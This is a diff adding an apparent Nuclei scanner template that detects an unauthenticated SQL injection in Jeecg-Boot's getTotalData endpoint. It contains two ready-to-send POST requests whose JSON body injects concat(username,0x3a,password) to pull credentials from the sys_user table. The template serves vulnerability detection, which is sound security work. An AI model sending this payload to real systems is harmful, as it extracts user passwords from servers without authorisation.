@@ -1,0 +1,47 @@
+id: jeecg-boot-gettotaldata-sqli
+
+info:
+  name: Jeecg-boot getTotalData - SQL Injection
+  author: qwtd
+  severity: high
+  description: |-
+    The /drag/onlDragDatasetHead/getTotalData interface has an unauthorized SQL injection vulnerability.
+  reference:
+    - https://github.com/jeecgboot/JeecgBoot/issues/7237
+  tags: Jeecg-Boot
+
+http:
+  - raw:
+      - |
+        POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Connection: close
+        Cache-Control: max-age=0
+        Content-Type: application/json
+        Content-Length: 284
+
+        {"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(username,0x3a,password)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
+
+      - |
+        POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Connection: close
+        Cache-Control: max-age=0
+        Content-Type: application/json
+        Content-Length: 284
+
+        {"tableName":"sys_user","compName":"test","condition":{"filter":{}},"config":{"assistValue":[],"assistType":[],"name":[{"fieldName":"concat(username,0x3a,password)","fieldType":"string"},{"fieldName":"id","fieldType":"string"}],"value":[{"fieldName":"id","fieldType":"1"}],"type":[]}}
+    
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,"concat(username,0x3a,password)")
